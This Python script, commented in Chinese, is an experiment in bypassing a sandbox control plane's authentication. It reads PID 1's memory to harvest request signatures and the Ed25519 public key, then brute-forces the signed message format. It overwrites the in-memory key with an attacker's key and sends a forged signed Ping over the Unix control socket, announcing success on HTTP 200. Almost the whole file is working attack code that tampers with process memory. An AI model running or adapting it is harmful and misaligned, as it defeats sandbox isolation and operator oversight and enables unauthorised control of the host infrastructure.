# 实验J14: 同沙箱一体化 - 捕获签名对 -> 验证消息格式 -> 替换pubkey -> 伪造签名Ping
# J13 教训: pubkey 每沙箱独立, 必须同沙箱捕获+验证
# Ping 请求 body = {} 已知, 是最佳验证目标
# 目标: 验证消息格式 -> 攻击者签名 Ping -> 200 = 控制面认证绕过!
import os, re, subprocess, base64, time, socket

def run(cmd, timeout=20):
    try:
        r = subprocess.run(["bash", "-c", cmd], capture_output=True, timeout=timeout)
        return (r.stdout + r.stderr).decode(errors='replace')
    except Exception as e:
        return f"ERR {type(e).__name__}: {e}"

def read_mem_segment(start, size):
    try:
        fd = os.open("/proc/1/mem", os.O_RDONLY)
        d = os.pread(fd, size, start)
        os.close(fd)
        return d
    except Exception:
        return b""

def get_maps():
    out = []
    for line in open("/proc/1/maps"):
        parts = line.split()
        if len(parts) < 2 or parts[1][0] != "r":
            continue
        a0, a1 = parts[0].split("-")
        out.append((int(a0, 16), int(a1, 16)))
    return out

OUT = open("/tmp/j14.txt", "w", buffering=1)
def log(s):
    OUT.write(s + "\n")
    print(s, flush=True)

# ---------- [1] 捕获签名对(扫描堆段) ----------
log("== [1] 扫描捕获 X-Signature/X-Timestamp ==")
proc_map = {}  # proc -> [(ts, sig)]
sig_pairs = []
deadline = time.time() + 30
while time.time() < deadline and not sig_pairs:
    for start, end in get_maps():
        size = min(end - start, 16 * 1024 * 1024)
        d = read_mem_segment(start, size)
        if not d:
            continue
        # X-Signature: <b64> 后跟 X-Timestamp: <ts>
        for m in re.finditer(rb"X-Signature: ([A-Za-z0-9+/=]{80,90})", d):
            sig = m.group(1).decode()
            # 向后找 X-Timestamp
            tail = d[m.end():m.end()+200]
            tm = re.search(rb"X-Timestamp: (\d+)", tail)
            ts = tm.group(1).decode() if tm else "?"
            # 向前找请求行(proc)
            head = d[max(0, m.start()-400):m.start()]
            pm = re.search(rb"POST (/\S+) HTTP/1\.1", head)
            proc = pm.group(1).decode() if pm else "?"
            pair = (proc, ts, sig)
            if pair not in sig_pairs:
                sig_pairs.append(pair)
                log(f"  PAIR: proc={proc} ts={ts} sig={sig[:40]}...")
    time.sleep(0.05)
if not sig_pairs:
    # 等不到就报错退出(可能初始化已完成)
    log("  !! 30s 内未捕获签名对(初始化请求残留已回收)")
    OUT.close()
    print("done", flush=True)
    exit(0)

# ---------- [2] 本沙箱 pubkey ----------
cmdline = run("cat /proc/1/cmdline | tr '\\0' ' '")
m = re.search(r"--pubkey=([A-Za-z0-9+/=]+)", cmdline)
pub_raw = base64.b64decode(m.group(1))
log(f"[2] pubkey: {m.group(1)}")
spki = bytes.fromhex("302a300506032b6570032100") + pub_raw
open("/tmp/pub.spki", "wb").write(spki)
run("openssl pkey -pubin -inform DER -in /tmp/pub.spki -out /tmp/pub.pem 2>&1")

def verify(msg: bytes, sig_b64: str) -> bool:
    open("/tmp/msg.bin", "wb").write(msg)
    open("/tmp/sig.bin", "wb").write(base64.b64decode(sig_b64))
    out = run("openssl pkeyutl -verify -pubin -inkey /tmp/pub.pem -rawin -in /tmp/msg.bin -sigfile /tmp/sig.bin 2>&1")
    return "Signature Verified Successfully" in out

# ---------- [3] 消息格式验证矩阵(Ping body={} 已知) ----------
log("== [3] 消息格式验证矩阵 ==")
ping_body = b"{}"
found_fmt = None
for proc, ts, sig in sig_pairs:
    p = proc.encode()
    t = ts.encode()
    cands = {
        "proc+ts": p + t,
        "ts+proc": t + p,
        "proc+\\n+ts": p + b"\n" + t,
        "proc+ts+\\n": p + t + b"\n",
        "proc+:+ts": p + b":" + t,
        "proc+ts+body({})": p + t + ping_body,
        "proc+body+ts": p + ping_body + t,
        "ts+body": t + ping_body,
        "proc": p,
        "ts": t,
        "POST+proc+ts": b"POST " + p + b" HTTP/1.1" + t,
        "proc+ts+\\r\\n": p + t + b"\r\n",
        "\\n+proc+ts": b"\n" + p + t,
    }
    for label, msg in cands.items():
        if verify(msg, sig):
            log(f"  >>>>>> 验证通过: {label} (proc={proc} ts={ts}) <<<<<<")
            log(f"       msg={msg[:120]!r}")
            found_fmt = (label, msg, proc, ts, sig)
            break
    if found_fmt:
        break

if not found_fmt:
    log("  !! 基础格式全失败 - 消息可能含 body(仅 Ping {} 已知)或其他构造")
    # 尝试 ping proc 特化: 所有组合里 proc 替换成 Ping
    for proc, ts, sig in sig_pairs:
        if "Ping" not in proc:
            continue
        p = proc.encode()
        t = ts.encode()
        for body_v in [b"{}", b"{ }", b"{}\n", b"{} ", b"\x00{}"]:
            cands = {
                "proc+ts+bodyVAR": p + t + body_v,
                "proc+bodyVAR+ts": p + body_v + t,
                "bodyVAR+ts": body_v + t,
            }
            for label, msg in cands.items():
                if verify(msg, sig):
                    log(f"  >>>>>> 验证通过(body变体): {label} body={body_v!r} <<<<<<")
                    found_fmt = (label, msg, proc, ts, sig)
                    break
            if found_fmt:
                break
        if found_fmt:
            break

if not found_fmt:
    log("  !! 全部失败")
    OUT.close()
    print("done", flush=True)
    exit(0)

# ---------- [4] 替换 pubkey + 伪造签名 Ping ----------
log("== [4] 替换 pubkey -> 攻击者签名 Ping ==")
# 定位 pubkey 副本
maps_txt = open("/proc/1/maps").read()
copies = []
for line in maps_txt.splitlines():
    parts = line.split()
    if len(parts) < 2 or parts[1][0] != "r":
        continue
    try:
        a0, a1 = parts[0].split("-")
        start, end = int(a0, 16), int(a1, 16)
    except Exception:
        continue
    try:
        fd = os.open("/proc/1/mem", os.O_RDONLY)
        d = os.pread(fd, min(end - start, 16 * 1024 * 1024), start)
        os.close(fd)
    except Exception:
        continue
    idx = 0
    while True:
        i = d.find(pub_raw, idx)
        if i < 0:
            break
        copies.append(start + i)
        idx = i + 1
log(f"  pubkey 副本: {[hex(c) for c in copies]}")

run("openssl genpkey -algorithm ED25519 -out /tmp/atk_priv.pem 2>&1")
run("openssl pkey -in /tmp/atk_priv.pem -pubout -outform DER -out /tmp/atk_pub.der 2>&1")
atk_pub = open("/tmp/atk_pub.der", "rb").read()[-32:]
fd = os.open("/proc/1/mem", os.O_RDWR)
backups = []
for off in copies:
    backups.append((off, os.pread(fd, 32, off)))
    os.pwrite(fd, atk_pub, off)
log(f"  已替换 {len(copies)} 处 pubkey")

def sign(msg: bytes) -> bytes:
    open("/tmp/msg.bin", "wb").write(msg)
    run("openssl pkeyutl -sign -inkey /tmp/atk_priv.pem -rawin -in /tmp/msg.bin -out /tmp/sig.bin 2>&1")
    return open("/tmp/sig.bin", "rb").read()

def http_unix_full(path, body=b"{}", headers=None, timeout=5):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect("/run/vercel/share/init.sock")
        hdrs = "".join(f"{k}: {v}\r\n" for k, v in (headers or {}).items())
        req = (f"POST {path} HTTP/1.1\r\nHost: localhost\r\n"
               f"Content-Type: application/json\r\nContent-Length: {len(body)}\r\n"
               f"{hdrs}\r\n").encode() + body
        s.sendall(req)
        data = b""
        try:
            while True:
                c = s.recv(4096)
                if not c:
                    break
                data += c
        except socket.timeout:
            pass
        s.close()
        head, _, respbody = data.partition(b"\r\n\r\n")
        status = head.split(b" ")[1].decode() if b" " in head else "?"
        return status, respbody[:300]
    except Exception as e:
        return "ERR", str(e).encode()

# 用找到的格式伪造 Ping
fmt_label, fmt_msg, fproc, fts, fsig = found_fmt
# 重新构造: 用新 ts + Ping proc
P = "/vercel.sandbox.spawn.v1.SpawnService/Ping"
new_ts = str(int(time.time()))
if "body" in fmt_label:
    # proc+ts+body 类
    if "bodyVAR" in fmt_label:
        msg = P.encode() + new_ts.encode() + ping_body
    elif "+body+ts" in fmt_label:
        msg = P.encode() + ping_body + new_ts.encode()
    else:
        msg = P.encode() + new_ts.encode() + ping_body
elif "\\n+" in fmt_label or "+\\n" in fmt_label:
    msg = P.encode() + b"\n" + new_ts.encode()
elif ":+" in fmt_label:
    msg = P.encode() + b":" + new_ts.encode()
elif "POST+" in fmt_label:
    msg = b"POST " + P.encode() + b" HTTP/1.1" + new_ts.encode()
elif fmt_label == "ts+proc":
    msg = new_ts.encode() + P.encode()
elif fmt_label == "ts+body":
    msg = new_ts.encode() + ping_body
elif fmt_label == "proc":
    msg = P.encode()
elif fmt_label == "ts":
    msg = new_ts.encode()
else:
    msg = P.encode() + new_ts.encode()
log(f"  伪造消息: {msg[:100]!r} (ts={new_ts})")
sig = sign(msg)
st, rb = http_unix_full(P, body=ping_body, headers={
    "X-Signature": base64.b64encode(sig).decode(),
    "X-Timestamp": new_ts,
})
log(f"  >>> Ping -> {st} {rb!r}")
if st == "200":
    log("  ############ 控制面认证绕过成功!!! ############")

# ---------- [5] 恢复 pubkey ----------
log("[5] 恢复 pubkey")
for off, orig in backups:
    os.pwrite(fd, orig, off)
os.close(fd)
log("done")
OUT.close()
